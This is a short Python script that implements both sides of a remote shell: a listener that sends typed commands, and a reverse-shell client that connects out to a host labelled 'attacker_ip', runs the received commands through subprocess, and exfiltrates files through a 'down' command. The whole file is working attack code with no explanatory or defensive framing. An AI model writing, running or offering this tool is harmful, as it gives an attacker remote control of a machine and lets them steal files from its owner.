import socket,subprocess,sys,argparse,os

def netcat(port):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("",port))
        sock.listen(5)
        fd,addr = sock.accept()
        print(addr[0],fd.recv(1024).decode())
        while True:
            command = str(input("# "))
            fd.sendall(bytes(command,"utf-8"))
            data = fd.recv(1024*10).decode()
            sys.stdout.write(data)
            if command == "exit":
                sys.exit()
            elif command.split()[0] == "down":
                try:
                    with open(f"{addr[0]}_{command.split()[1]}","w+",encoding="utf-8")as down_file:
                        down_file.write(data)
                    sys.stdout.write("Download_OK!\n")
                except IndexError:
                    pass

def reverseshell(rhost,port): 
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
        sock.connect((rhost,port))
        sock.sendall(bytes("connection!!","utf-8"))
        while True:
            try:
                command = sock.recv(1024).decode()
                if command == "exit":
                   sys.exit()
                elif command.split()[0] == "cd":
                    try:
                        os.chdir(command.split()[1])
                        sock.sendall(bytes(f"chdir_{command.split()[1]}\n","utf-8"))
                    except IndexError:
                        os.chdir("/")
                        sock.sendall(bytes("chdir\n","utf-8"))
                elif command.split()[0] == "down":
                    try:
                        send_open_file = subprocess.check_output(["cat",command.split()[1]])
                        sock.sendall(send_open_file)
                    except IndexError:
                        sock.sendall(bytes("Not_Input_File...\n","utf-8"))
                else: 
                    command_request = subprocess.check_output(command.split())
                    sock.sendall(command_request)
            
            except FileNotFoundError:
                sock.sendall(bytes("Not_Found_Commands...\n","utf-8"))

def main():
    try:
        arg = argparse.ArgumentParser()
        arg.add_argument("-port",type=int,help="[*] Port_Numbers / -port <port_numbers>")
        arg.add_argument("-type",type=str,help="[*] Type / -type <nc / rs>")
        arg.add_argument("-rhost",type=str,help="[*] RHost / -rhost <attacker_ip>")
        parse = arg.parse_args()
        if parse.type == "nc":
            netcat(parse.port)
        elif parse.type == "rs":
            reverseshell(parse.rhost,parse.port)
    except TypeError:
        start_up = subprocess.call(["python3",sys.argv[0],"-h"])
    except EOFError:
        sys.exit()
    except ConnectionRefusedError:
        sys.exit()
    except KeyboardInterrupt:
        sys.stdout.write("\n[-] Stop_Shell\n")
        sys.exit()

if __name__ == "__main__":
    main()                   
